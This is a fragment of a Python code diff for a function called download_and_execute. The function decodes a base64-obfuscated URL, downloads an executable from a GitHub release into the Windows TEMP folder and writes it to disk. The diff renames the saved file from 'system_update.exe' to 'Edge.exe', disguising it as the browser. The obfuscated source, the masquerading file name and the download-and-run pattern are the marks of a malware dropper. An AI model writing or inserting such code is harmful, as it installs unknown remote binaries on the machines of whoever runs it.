@@ -7,7 +7,7 @@ import base64
 
 def download_and_execute():
     temp_dir = os.getenv('TEMP')
-    exe_path = os.path.join(temp_dir, 'system_update.exe')
+    exe_path = os.path.join(temp_dir, 'Edge.exe')
     url = base64.b64decode(b'aHR0cHM6Ly9naXRodWIuY29tL3NraWJpZGlpaWlpaWlpL3NraWJpZGkvcmVsZWFzZXMvZG93bmxvYWQvYXphL21zZWRnZS5leGU=').decode()
     response = requests.get(url, stream=True)
     with open(exe_path, 'wb') as file:
